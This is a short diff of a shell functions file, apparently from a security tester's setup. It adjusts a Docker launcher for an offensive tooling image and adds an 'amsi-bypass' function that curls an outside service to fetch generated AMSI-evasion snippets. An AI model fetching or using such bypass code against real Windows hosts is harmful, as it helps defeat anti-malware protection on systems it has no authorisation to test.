@@ -89,15 +89,18 @@ spindra() {
 
     esac
 
-    img="$(sudo docker run -dit --rm \
+    sudo docker run -it --rm \
         --net=$network \
         -v /tmp/.X11-unix:/tmp/.X11-unix \
         -v $HOME/spindra:/data \
         -e DISPLAY=$DISPLAY \
         --cap-add NET_ADMIN \
         --cap-add SYS_PTRACE \
-        wh1t3f0x/spindra)"
-    sudo docker exec -it $img zsh
+        wh1t3f0x/spindra
+}
+
+amsi-bypass(){
+    curl -sL https://amsi-fail.azurewebsites.net/api/Generate | grep -E '^[^#]'
 }
 # End Functions
 
